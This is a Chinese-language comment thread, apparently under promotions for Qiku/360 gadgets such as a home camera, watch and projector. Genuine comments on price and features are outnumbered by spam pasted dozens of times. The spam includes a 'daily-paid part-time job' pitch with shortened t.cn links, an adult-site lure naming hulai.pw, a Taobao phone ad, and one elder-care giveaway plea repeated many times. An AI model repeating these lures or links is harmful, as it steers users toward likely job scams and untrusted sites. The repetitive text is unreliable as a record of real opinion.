我靠，太炫了…………
诏搛耳只 工资每天結算～ 【 http://t.cn/8sfyr3p 】复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
 工资每天結算～ 【 http://t.cn/8sfyr3p 】复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
这样空调就智能化了，真棒！
已删除 并对垃圾评论封号！！
诏搛耳只 工资每天結算～ 【 http://t.cn/8sfyr3p 】复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～ 【 http://t.cn/8sfyr3p 】复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～ 【 http://t.cn/8sfyr3p 】复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
支持多种设备共享连接才好
好厉害耶！
好东西物有所值值得拥有
有点贵哟…………
我想买个也成啊，怎么就没了呢
我好像用呀 
很想第一个能试用。。。
我觉得好贵，你们呢？？
好贵呀~亲…………
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
诏搛耳只 工资每天結算～ 【 http://t.cn/8sfyr3p 】复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～ 【 http://t.cn/8sfyr3p 】复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～ 【 http://t.cn/8sfyr3p 】复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～ 【 http://t.cn/8sfyr3p 】复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
帅，酷毙了，功能再多点就好了
大爱啊哈哈 笑
支持奇酷，支持360！！！！！  
360是互联网的良心。
诏搛耳只 工资每天結算～ 【 http://t.cn/8sfyr3p 】复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～  （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
诏搛耳只  工资每天結算～ 【 http://t.cn/8sfyr3p 】复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
看起来很棒的样子
诏搛耳只 工资每天結算～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
小米3官网1499，怎么奇酷还要1999，见鬼了
售价500元人民币  这个价格你们不觉得高吗
诏搛耳只 工资每天結算～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
希望可以被选中，电子产品是我的最爱，尤其是360的，哈哈
这个太帅了，太符合我的口味了 ，超级喜欢
这个研发出来，在电子市场的价格区间是多少啊！看起来还可以呢！期待！
支持360
诏搛耳只 工资每天結算～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
诏搛耳只 工资 每天結算～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
说得好 赞同 
诏搛耳只 工资每天結算～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
酷炫( ⊙ o ⊙ )啊！
外型时尚！表带设计可以哦！功能也好！整体看是一款实用酷炫的电子手表！期待早日在电子市场购买到！支持！期待！
超级期待啊
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
一直支持用奇酷的产品，希望能中
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
可以啊，你没试过，怎么知道台式机不可以开呢？ 
很棒的产品，哇咔咔！！！
工资每天結算～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
工资每天結算～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
能告诉我1200M在哪么?
期待中……
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直想要个投影仪呢！看你们的介绍觉得这一款还可以呢！小型投影仪可以呢！价格是我们关注的主要问题呢！希望价格合理！物有所值！支持！期待！
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直关注，错失一个又一个的试用机会，不过我要坚持不懈的支持奇酷微博和微信。
外型简洁大方！功能可以！推出价格可以！但与手机平板电脑连接的那些只是支持苹果那一些的吗？
超期待！！！！
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
工资每天結算～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～  （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
工资每天結算～ 【 http://t.cn/8sfyr3p 】  复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
工资每天結算～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～  （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
宅男福利！直接复制【hulai.pw】进入大家都懂得！男士福利！女生勿入!
工资每天結算～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～ ～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
宅男福利！直接复制【hulai.pw】进入大家都懂得！男士福利！女生勿入!
宅男福利！直接复制【hulai.pw】进入大家都懂得！男士福利！女生勿入!
工资每天結算～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
希望可以抽到
想要，非常喜欢，可爱又实用 
http://item.taobao.com/item.htm?spm=a1z10.1.w5003-5680799794.4.m0SGeM&amp;id=36625160482&amp;scene=taobao_shop红米手机 8核神机 1300像素 特价699元包邮送礼 要的数度
宅男福利！直接复制【hulai.pw】进入大家都懂得！男士福利！女生勿入! 
对于我这健忘的人实在是好东西啊 ！！！期待早日来到我身边 
这个太让人期待了
工资每天結算～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～即可报名咨询 ～不限制工作时间，做的越多挣的越多～ ～ （宝妈、学生、上班族都可以）～每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
真的是好东东啊  能给我们解决很多的麻烦
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。 
一直都在关注奇酷包括微博和微信，家里面有个老人行动不便，我还要工作请了好几个保姆都不称心，现在家里面就他一个人着实的不放心，希望可以申请到小水滴连上wifi，让我随时能看到家里老人的状况。 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
水分很大 揭开无线路由传输速率的秘密    http://blog.renren.com/share/251548191/6050556303  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
宅男福利！直接复制【hulai.pw】进入大家都懂得！男士福利！女生勿入!  
水分很大 揭开无线路由传输速率的秘密                   http://blog.renren.com/share/251548191/6050556303
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
宅男福利！直接复制【hulai.pw】进入大家都懂得！男士福利！女生勿入!  
中国第一免费杀毒软件，所有推出的产品无论是性能还是价格总是让人放心，这一次我相信依然会是如大家所想的一样。
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
工资每天結算～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
工资每天結算～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生 、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
宅男福利！直接复制【hulai.pw】进入大家都懂得！男士福利！女生勿入!  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～ ～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
工资每天結算  ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学 生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝 妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
--------【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
--------【业余找工作】 --------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
-------- 【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
-------- 【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工 作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
宅男福利！直接复制【hulai.pw】进入大家都懂得！男士福利！女生勿入!  
宅男福利！直接复制【hulai.pw】进入大家都懂得！男士福利！女生勿入!  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
-------- 【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
-------- 【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
感觉好酷,好想拥有一个好期待啊！！希望价位不要太高，能使用就更好了 期待
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
-------- 【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制 工作时间，做的越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
力顶360 希望多多出好产品！
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
宅男福利！直接复制【hulai.pw】进入大家都懂得！男士福利！女生勿入!  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
-------- 【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解 ～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
-------- 【业余找工作】 --------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
宅男福利！直接复制【hulai.pw】进入大家都懂得！男士福利！女生勿入!  
诏搛耳只 工资每天結算～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
宅男福利！直接复制【hulai.pw】进入大家都懂得！男士福利！女生勿入!  
宅男福利！直接复制【hulai.pw】进入大家都懂得！男士福利！女生勿入!  
------- 【业余找工作】 --------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
------- 【业余找工作】 --------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的 越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
